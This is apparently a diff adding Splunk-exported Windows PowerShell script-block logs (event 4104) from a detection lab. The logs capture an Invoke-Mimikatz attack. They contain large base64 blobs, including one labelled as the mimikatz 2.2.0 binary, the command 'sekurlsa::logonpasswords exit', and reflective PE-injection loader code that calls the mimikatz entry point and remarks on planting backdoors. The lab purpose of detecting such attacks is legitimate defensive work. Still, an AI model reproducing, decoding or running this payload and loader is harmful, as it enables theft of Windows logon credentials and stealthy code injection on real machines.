CiqKKworiiwKLIotCi2KLgouii8KL4ogCjCKMQoxijIKMoozCjOKNQo2ijcKOAo5CjmKOgo7CjuKPQo9ij8KP4oxCkGKQgpDCkOKRApFCkWKRgpHCkeKSQpJiksKS4pNCk2KTwpPikEKUYpTClOKVQpVilcKV4pZClmKWgpbCluKXApdCl2KXgpeilAKYYpjCmOKaApoimkKaYpqCmqKYApyCnKKcwpzinQKdIp1CnWKdgp2incKd4p4CniKeQp5inoKeop7CnuKfAp8in0KfYpwCoCKgQqBioIKgoqDCoOKhAqEioUKhYqGCoaKhwqHiogKiIqJComKigqLCouKjIqNCo2KjgqOio8Kj4qACpCKkQqRipIKkoqTCpOKlAqUipgKmoqbCpuKnAqcip0KnYqfCp+KkAqgiqEKoYqiCqKKowqjiqQKpIqlCqWKpgqmiqcKqAqoiqmKqgqrCquKrIqtCq4KroqviqAKsQqxirKKswqzirUKtoq3CriKugq6irsKu4q8CryKvQq9ir4Kvoq/Cr+KsArAisEKwYrCCsKKwwrDisQKxIrFCsWKxgrGiscKx4rICsiKyQrJisoKyorLCsyKzgrOis8Kz4rACtCK0QrRitIK0orTCtOK1ArUitUK1YrWCteK2QrZitoK2orbCtuK3Arcit0K3YreCt6K3wrfitAK4IrhCuGK4griiuMK44rkCuSK5QrliuYK5ornCueK6AroiukK6YrqCuqK6wrriuwK7IrtCu2K7gruiu8K74rgCvCK8QrxivIK8orzCvOK9Ar0ivUK9Yr2CvaK9wr3ivgK+Ir5CvmK+gr7iv0K/Yr+Cv6K/wr/ivANALAKgCAAAAoAigEKAYoCCgKKAwoDigQKBIoFCgWKBgoGigcKB4oICgiKCQoJigoKCooLCgwKDIoOCg6KDwoPigAKEIoRihIKEwoTihSKFQoWChaKF4oYChkKGYoaihsKHIoeCh6KH4oQCiEKIYoiiiMKJAokiiYKJoonCieKKAopiioKKoorCiuKLAosii0KLYouCi6KLwoviiAKMIoxCjGKMgoyijMKM4o0CjSKNQo1ijYKNoo3CjeKOAo4ijkKOYo6CjqKOwo/ijAKQYpDCkOKRApEikUKRYpGCkaKRwpHikgKSIpJCkmKSgpKiksKS4pMCkyKTQpNik4KTopPCk+KQApQilEKUYpSClKKUwpTilQKVIpVClWKVgpWilcKV4pYCliKWQpZiloKWopbCluKXApcil0KXYpeilAKYIphCmGKYgpiimMKY4pkCmSKZQplimYKZopnCmeKaApoimkKaopsCmyKbQptim4KbopvCm+KYApwinEKcYpyCnKKcwpzinQKdIp1CnWKdgp2incKd4p4CniKeQp5inoKeop7CnuKfAp8in0KfYp+Cn6Kfwp/inAKgIqBCoKKhAqEioUKhYqGCoaKhwqHiogKiIqJComKigqKiosKjAqMio2KjgqPioEKkYqSCpKKkwqTipUKlwqZCpsKm4qdCp2KnwqfipEKogqiiqQKpIqlCqWKpgqniqoKqoqrCq0KrYquCq6KrwqviqAKsIqxCrGKsgqyirMKs4q0CrSKtQq1irYKtoq3CreKuAq4irkKuYq6CrqKuwq7irwKvIqwCsMKw4rECsSKxQrFisYKxorHCseKyArIiskKyYrKCsqKywrLiswKzIrNCs2KzgrOis8Kz4rCCtKK0wrTitgK3Irdit6K34rQCuCK4A4AsAzAAAABCmGKYgpiimMKZApkimUKZYpmCmaKZwpnimgKaIppCmmKagpqimsKa4psCmyKbQptim4KbopvCm+KYApwinEKcYpyCnKKcwpzinQKdIp1CnWKdgp2incKd4p4CniKeQp5inoKeop7CnuKfAp8in0KfYp+Cn6Kfwp/inAKgIqBCoGKggqCioMKg4qECoSKhQqFioYKhoqHCoeKiAqIiokKiYqKCoqKiwqLiowKjIqNCo2KjgqOio8Kj4qACpCKkQqRipuKoA8AsAHAAAAACgCKAQoBig6KD4oAChGKEgoQAAADAQAIQAAABwobih2KH4oRiiOKJoooCiiKKQosii0KIgo1ilgKiIqJComKigqKiosKi4qMCoyKjYqOCo6KjwqPioAKkIqRCpoKmoqaCrwKvQq+irAKxArFCskKygrOCs8KwwrUCtwK3QrRCuIK5grnCusK7ArgCvEK9Qr2CvoK+wr/CvAEAQALAAAAAAoFCgYKCgoLCg4KDooPCg+KAAoQihGKFAolCikKKgouCi8KIwo0CjgKOQo9Cj4KMgpDCkcKSApMCk0KQQpSClYKVwpbClwKUAphCmUKZgpqCmsKbwpgCnOKfgp/CnkKjgqDCpgKnQqSCqcKqAqsCq0Kpgq3CrsKvAqwCsEKxQrGCs4KzwrDCtQK2ArZCt0K3grUCuWK5wrsCu0K4QryCvYK9wr7CvwK8AUBAAeAAAAACgEKBQoGCgEKEgoWChcKGwocChAKIQolCiYKKgorCi8KIAo0CjUKOQo6CjYKSwpAClUKWgpYCm0KYgp3CnwKcQqICo0KggqXCpwKkQqmCqsKoAq1CroKvwq0CskKzgrDCtgK3wrQiuUK6grvCuwK8AYBAAoAAAABCgYKCwoAChUKGgofChQKKQotCi2KLooiCjOKNwo4ij0KMgpHCkwKQQpWClsKUQphimKKaAptCmIKdwp8CnEKhgqLCo8Kj4qAipUKmQqZipqKngqeip+KlAqpCq4KpAq0irWKugq/CrMKw4rEiskKzgrDCtmK24reCtAK4orkiucK6Qrriu2K4AryCvSK9or5CvsK/Yr/ivAHAQACABAAAgoECgiKCwoLigwKDQoPigGKFgoYihkKGYoaih0KHwoRiiOKJgooCiqKLIovCiEKM4o1ijgKOgo8ij6KMQpDCkWKR4pKCkwKTopAilMKVQpXilmKXApeClCKYoplCmcKaYprim4KYApyinSKdwp5CnuKfYpwCoIKhIqGiokKiwqNio+KggqUCpaKlwqXipgKmIqbCpuKnAqcip0Kn4qQCqCKoQqhiqQKpIqlCqWKpgqoiqkKqYqqCqqKrQqtiq4KroqvCqGKsgqyirMKs4q1CrYKuAq5irqKvIq+Cr8KsQrFisoKzIrOisGK0grSitMK04rUCtaK1wrXitgK2IrZCtmK2grbityK3orQCuEK4wrkiuWK54rgAAAIAQAPQBAACYoqCiqKKworii4KLoovCi+KIAoyijMKM4o0CjSKNwo3ijgKOIo5CjuKPAo8ij0KPYowCkCKQQpBikIKRIpFCkWKRgpGikkKSYpKCkqKSwpNik4KTopPCk+KQgpSilMKU4pUClaKVwpXilgKWIpbCluKXApcil0KX4pQCmCKYQphimQKZIplCmWKZgpoimkKaYpqCmqKbYpuCm6KbwpvimAKcopzCnOKdAp0inUKdYp2CniKeQp5inoKeop7Cn2Kfgp+in8Kf4pwCoCKgQqCCoKKg4qFCoaKhwqICoiKiYqKCosKi4qMio0KjgqOio+KgAqRCpGKkoqUCpWKlgqXCpeKmIqZCpoKm4qcCp0KnYqeip8KkAqgiqGKogqjCqOKpIqlCqYKpoqniqgKqQqpiqqKrAqsiq2KrgqvCq+KoIqxCrIKsoqzirQKtQq1iraKtwq4CriKuYq6CrsKu4q8ir0Kvgq+ir+KsArBCsGKworDCsQKxYrHCseKyIrJCsoKyorLiswKzQrNis6KzwrACtCK0YrSCtMK04rUitUK1grWiteK2ArZCtmK2orbCtwK3Irdit4K3wrQiuEK4griiuOK5QrmiugK6YrrCuyK7gruiu+K4ArxCvGK8or0CvWK9wr4ivkK+4r9ivAAAAkBAAZAAAAACgIKBIoGiggKCQoKCgsKDQoOCgGKEgoSihMKE4oUChaKFwoXihgKGIoZChmKGgoaihsKG4ocChyKHQodih4KHoofCh+KEAohCiGKIgoiiiMKI4okCiSKJQogAAAAAAAAAAAAA='
+
+  	# mimikatz 2.2.0 (win 32) #18362
+    # SHA256 hash: 08AB87667A5C6EB25DDB1BD659613EF8C773526AE28B191C34E854CD6F13F8D4 
+    # VirusTotal Analysis: no signature yet ;)
+    $PEBytes32 = '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
+d261f22f-3dc8-4dc6-914f-cd178abb26fe","2025-11-23T14:39:14.630+0000",,,Execute,,"DESKTOP-78CU07R","DESKTOP-78CU07R",,505,"endpoint_services_processes windows_event_signature windows_ta_data","DESKTOP-78CU07R",505,"mydfir-project",,27,,,,,,,"//_::._=--/===-==-------==--====___=__=________.__",,,,,,,,,,,,medium,3,,,4104,,,,,,,"Microsoft-Windows-PowerShell/Operational",WinEventLog,,"chalitha-splunk",,,,,,"track_event_signatures",,"track_event_signatures",,,,,,"Microsoft Windows",
+,,,,,,"DESKTOP-78CU07R",,Continue,,,,,,,,4104,3,"sekurlsa::logonpasswords exit",,,,,,,,,,,None,"Microsoft-Windows-PowerShell/Operational",,,,Splunk,,,On,"[System.Runtime.InteropServices.Marshal]","$WStringFunc.Invoke($WStringInput)",,,"'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOAEAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABefCzVGh1ChhodQoYaHUKGroGzhh8dQoaugbGGjx1Chq6BsIYVHUKGG3BGhwsdQoYbcEGHEh1ChgGA3oYYHUKGfPOJhh4dQoaB9omGGB1ChhNlxYYYHUKGG3BHhzodQoZsgDmGEB1ChhNl0YY/HUKGGh1Dhi0fQobQcEqHeh1ChtBwQocbHUKG0HC9hhsdQobQcECHGx1ChlJpY2gaHUKGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUEUAAGSGBwBA7LldAAAAAAAAAADwACIgCwIOFwCmCgAAZAYAAAAAADScCAAAEAAAAAAAgAEAAAAAEAAAAAIAAAUAAgAAAAAABQACAAAAAAAAYBEAAAQAAAAAAAADAGABAAAQAAAAAAAAEAAAAAAAAAAAEAAAAAAAABAAAAAAAAAAAAAAEAAAAMDoDwBgAAAAIOkPADACAAAAMBEAiAIAAACwEADUYQAAAAAAAAAAAAAAQBEA+BcAAHCgDwAcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgNIKAAgBAAAAAAAAAAAAAADACgBAEQAAIOUPAGAAAAAAAAAAAAAAAAAAAAAAAAAALnRleHQAAACgpQoAABAAAACmCgAABAAAAAAAAAAAAAAAAAAAIAAAYC5yZGF0YQAAlmUFAADACgAAZgUAAKoKAAAAAAAAAAAAAAAAAEAAAEAuZGF0YQAAALR9AAAAMBAAAGQAAAAQEAAAAAAAAAAAAAAAAABAAADALnBkYXRhAADUYQAAALAQAABiAAAAdBAAAAAAAAAAAAAAAAAAQAAAQF9SREFUQQAAlAAAAAAgEQAAAgAAANYQAAAAAAAAAAAAAAAAAEAAAEAucnNyYwAAAIgCAAAAMBEAAAQAAADYEAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAD4FwAAAEARAAAYAAAA3BAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEiLxEiJWAhIiXAQSIl4IESIQBhVQVZBV0iNaKhIgexAAQAAD7eFkAAAADPbZsdEJED/AEyL8USITCRCQLcEiFwkQ2aFwHQfSIuViAAAAEiNTCRFRIvAiEQkRECK+Oi+owgAQIDHBUiLtaAAAAA5nagAAAB1EmY5HnQNigZAD7bPQP7HiEQMQA+3BolFcEk5Hg+EHQEAAEQPtv9AgP//D4f1AAAAQTleGHQrSI0NV0gLAOj+iwAAQbgBAAAASI1MJEBBi9fo8/IAAEiNDUhICwDo34sAAEyNRCRASIu9mAAAAEWLz0E5Xgh0JQ+3BkiNTXBIiUwkMLqwNjEASYsOiUQkKEiJfCQg/xX7vQoA6x5Jiw5IjUVwSIlEJDAz0kiJfCQoSIlcJCD/FRO+CgCFwHVBQTleGHQpSI0N4kcLAOhxiwAAi1VwQbgBAAAASIvP6GjyAABIjQ29RwsA6FSLAAAPtwaLTXA7yA+Ww3dSZokO601BOV4ISI0Ns0cLAEiNFcxHCwBEi8BID0XRSI0N3kcLAOgdiwAA6yZBuf8AAABIjQ0aSAsATIvGQYvX6AOLAADrDEiNDZZICwDo9YoAAEyNnCRAAQAAi8NJi1sgSYtzKEmLezhJi+NBX0FeXcPMzEyL3EmJWwhJiWsQSYlzGFdIgexQAQAAQQ+3AUmL6GaDwAJMi8FIi4wkgAEAADP/ZkGJQyBJi/FIhckPhNYAAABBuf8AAABmQTvBD4eyAAAAx0QkSAEAAABJjUMgSIlEJEBFM8lIjUQkUEiJRCQ4ZolUJDBMiUQkKOij/f//hcAPhJ0AAAAPt5wkeAEAAIP7AnJguZAAAABmOUwcTnU7ZoPrAmY7HmaJnCR4AQAAQA+Wx3cWRA+3w0iNVCRQSIvN6HyhCABmiR7rWQ+3FkiNDf1HCwBED7fD6xJED7ZEHE9IjQ1qSAsAD7ZUHE7o5IkAAOswi9NIjQ3FSAsA6NSJAADrIA+30EiNDURJCwBNi8HowIkAAOsMSI0Ns0kLAOiyiQAATI2cJFABAACLx0mLWxBJi2sYSYtzIEmL41/DzMzMSI0FeZoQAMNMiUQkGEyJTCQgU1VWV0iD7DhJi/BIjWwkeEiL2kiL+ejT////SIlsJChMi85Ig2QkIABMi8NIi9dIiwjo098IAIPJ/4XAD0jBSIPEOF9eXVvDzMxAU0iD7HBIi8JIi9lIi8hIjVQkUP8V8rUKAIXAdHcPt1QkWkiNTCRgRA+3RCRYD7dEJFxED7dUJFZED7dcJFJED7dMJFCJRCRAiVQkOLoQAAAARIlEJDBMjQVWSQsARIlUJChEiVwkIOg/////hcB+JEyNTCRgSMdEJCAPAAAAQbgYAAAASI0VSEkLAEiLy/8V17kKAEiDxHBbw8xAU0iD7EBIi9lBsAFIjUwkMP8VIbwKAIXAeC8Pt0QkMEiNFRFJCwBMi0wkOEG4GwAAAEiLy4lEJCD/FZG5CgBIjUwkMP8V9rsKAEiDxEBbw0yL3FNIg+xQx0QkQGtpd2lIjQUpSgsASYlD4LsBAAAASI0FEUoLAESLy0mJQ9i6AAQAAEmJQ9C5AAABAEG4ABAAAEmJQ8j/FRy7CgBIiQVlkBAASIXAdHRIg2QkIABIjRVbkBAARTPJRTPASIvI/xXUugoAhcB5GIvQSI0Nd0gLAOjGhwAASIMlMpAQAADrSEiLDSGQEABIjRUqkBAASINkJCAARTPJRTPA/xXIugoAhcB5JIvQSI0Nq0gLAOiKhwAASIMl/o8QAADrDEiNDQVJCwDodIcAAEiDPdiPEAAAdBRIgz3WjxAAAHQKSIM91I8QAAB1BzPb6AsAAACLw0iDxFBbw8zMzEiD7ChIiw21jxAASIXJdA7/FWK6CgBIgyWijxAAAEiLDZOPEABIhcl0Dv8VOLoKAEiDJYCPEAAASIsNcY8QAEiFyXQO/xX+uQoASIMlXo8QAABIg8Qow8xIi8REiUggRIlAGEiJUBBIiUgIVVNWV0FUQVVBVkFXSI1ooUiB7IgAAAAz20iNTedEi+tIiR3ejxAASI09148QAP8VGa4KAESNSxJFM8Az0kiNTef/Fe61CgBMi/BIg/j/D4QbAwAAi/OJXX9IjUX3x0X3IAAAAESLzkiJRCQgTI1F5zPSSYvO/xXCtQoAiUVvRIvghcAPhM0CAABIjUV3SIlcJChFM8lIiUQkIEUzwIldd0iNVfdJi87/FYC1CgCFwA+FoQIAAP8VwrIKAIP4eg+FkgIAAItVd41Ixv8VxbIKAEyL+EiFwA+EegIAAMcACAAAAEiNVfdEi013SI1Fd0iJXCQoTYvHSYvOSIlEJCD/FSm1CgCFwA+EQQIAALkDAAAASIlcJDBEi8GJXCQoiUwkIEUzyUmNTwQz0v8VXbIKAEyL4EiD+P8PhPgBAABIjVXXx0XXDAAAAEiLyP8V3KwKAITAD4TRAQAAD7dV3UiNBXNHCwBED7dF24vLZkQ5QP51CWY5EA+ESwEAAP/BSIPAEIP5BnLlSIvzSIX2D4SVAQAA9kYEAg+EiwEAALqgAAAAjUqg/xXrsQoASIkHSIXAD4RxAQAASI1VZ0mLzP8VYqwKAITAdC1IixdIi01nSIPCJP8VbawKAIXAeQ6L0EiNDaDaCwDo74QAAEiLTWf/FSmsCgBJjU8E6HDeCABIi8hIi9NIiwdIiUgQSIsP8g8QRdfyDxFBGItF34lBIEiLB0iJcGhIiwfGRBBwBEj/wkiD+gJ870iLB0mNTwRIiVwkMEUzyYlcJCjGQHJVSIsHRIloCLgDAAAARIvAiUQkIIvQ/xUmsQoASIvISIsHSIlIeEiLD0iLQXhI/8hIg/j9D4eCAAAAx4GAAAAAiBMAAEyNBQsBAABMiw8zyUiJXCQoM9KJXCQg/xW5sAoASIvISIsHSImIiAAAAEiFyXQdSIs/Qf/F62GL8UiNBQZGCwBIweYESAPw6a7+////FZywCgCL0EiNDRvaCwDo6oMAAEiLD0iLSXj/FXGwCgBIiw//FViwCgDrIP8VcLAKAIvQSI0Nj9oLAOi+gwAASIsP/xU5sAoASIkHi3V/SYvM/xU6sAoA6xT/FUKwCgCL0EiNDfHaCwDokIMAAESLZW9Ji8//FQewCgD/xol1f0WF5A+F9fz//0mLzv8VuLIKAOsU/xUIsAoAi9BIjQ1X2wsA6FaDAABFhe0PlcOLw0iBxIgAAABBX0FeQV1BXF9eW13DzMxIiVwkEFdIg+wgM/9Ii9lIhcl0YUg5u4gAAAB0WDm7gAAAAHRQSDl7eHRKRTPJSMdEJDCPAAAASI1UJDBIi8tFjUEB6DwAAACFwHQOi4uAAAAA/xWMrwoA67pIi0t4/xVorwoASIl7eIm7gAAAAEiJu4gAAABIi1wkODPASIPEIF/DzMxIiVwkCEiJbCQQSIl0JBhXQVRBVUFWQVdIg+xARTPtTIv6SIv5RYvhRYvwQYv1QY1VQY1K//8VNa8KAEiL2EiFwA+EAAEAAEGNbQdEO/VyEkGL1kiNDebaCwDoVYIAAEQ79UEPQu5Fi9W+AQAAAIXtD4SbAAAATY1PAkEPtlH+isqKwgwQgOHwD7bAQo0M1QIAAAAPRNBCjQTVAQAAAIgUGEGKQf+IBBlCjQzVAwAAAEGKAU2NSQiIBBlCjQzVBAAAAEGKQfmIBBlCjQzVBQAAAEGKQfqIBBlCjQzVBgAAAEGKQfuIBBlCjQzVBwAAAEGKQfyIBBlCjQzVCAAAAEGKQf1EA9aIBBlEO9UPgmn///9mgUs9//9IjVMBx0M5BARV/0EPt81BuD4AAAAPtgJIA9ZmA8hMK8Z18g+3wYhLQGbB6AiIQz+F9g+EnwAAAOmIAAAAQYvtSIX/dGJIi094SI1B/0iD+P13VEQPt08qQbhBAAAARTvIcjNMjUwkMEyJbCQgSIvT/xXrrQoAi+iFwHU6/xW/rQoAi1cISI0NHdoLAESLwOgJgQAA6yCLVwhIjQ2p2gsA6PiAAADrD4tXCEiNDVjbCwDo54AAACP1RYXkdAVIiz/rA0mL/UiF/w+Fb////0iLy/8VSq0KAEyNXCRAi8ZJi1swSYtrOEmLc0BJi+NBX0FeQV1BXF/DzMxIi8RIiVgQSIlwGFdIg+wgg2AIAIvyx0AMAAAAgEiL+UiL2UiFyXQz","$PELoadedInfo[0]","Get-PEDetailedInfo",,,,,,,,,,"Invoke-CreateRemoteThread",409,"$PELoadedInfo[1]",,,,,,,"S-1-5-21-1697325460-2044954953-441488130-1001",0,"Microsoft-Windows-PowerShell",,"$Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)",Execute,,Warning,,"NOT_TRANSLATED","Get-MemoryProcAddress","[System.Runtime.InteropServices.Marshal]","Get-MemoryProcAddress","Get-DelegateType","[System.Runtime.InteropServices.Marshal]",,,,"11/23/2025 08:39:14.627 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=3
+ComputerName=DESKTOP-78CU07R
+User=NOT_TRANSLATED
+Sid=S-1-5-21-1697325460-2044954953-441488130-1001
+SidType=0
+SourceName=Microsoft-Windows-PowerShell
+Type=Warning
+RecordNumber=409
+Keywords=None
+TaskCategory=Execute a Remote Command
+OpCode=On create calls
+Message=Splunk could not get the description for this event. Either the component that raises this event is not installed on your local computer or the installation is corrupt.
+
+FormatMessage error:
+
+Got the following information from this event: 
+
+E, handle returned is NULL""
+		}
+		
+		$PEHandle = $PELoadedInfo[0]
+		$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
+		
+		
+		#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
+		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
+		if (($PEInfo.FileType -ieq ""DLL"") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
+		{
+			#########################################
+			### YOUR CODE GOES HERE
+			#########################################
+                    Write-Verbose ""Calling function with WString return type""
+				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName ""powershell_reflective_mimikatz""
+				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
+				    {
+					    Throw ""Couldn't find function address.""
+				    }
+				    $WStringFuncDelegate = Get-DelegateType @([IntPtr]) ([IntPtr])
+				    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
+                    $WStringInput = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArgs)
+				    [IntPtr]$OutputPtr = $WStringFunc.Invoke($WStringInput)
+                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($WStringInput)
+				    if ($OutputPtr -eq [IntPtr]::Zero)
+				    {
+				    	Throw ""Unable to get output, Output Ptr is NULL""
+				    }
+				    else
+				    {
+				        $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
+				        Write-Output $Output
+				        $Win32Functions.LocalFree.Invoke($OutputPtr);
+				    }
+			#########################################
+			### END OF YOUR CODE
+			#########################################
+		}
+		#For remote DLL injection, call a void function which takes no parameters
+		elseif (($PEInfo.FileType -ieq ""DLL"") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
+		{
+			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName ""VoidFunc""
+			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
+			{
+				Throw ""VoidFunc couldn't be found in the DLL""
+			}
+			
+			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
+			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
+			
+			#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
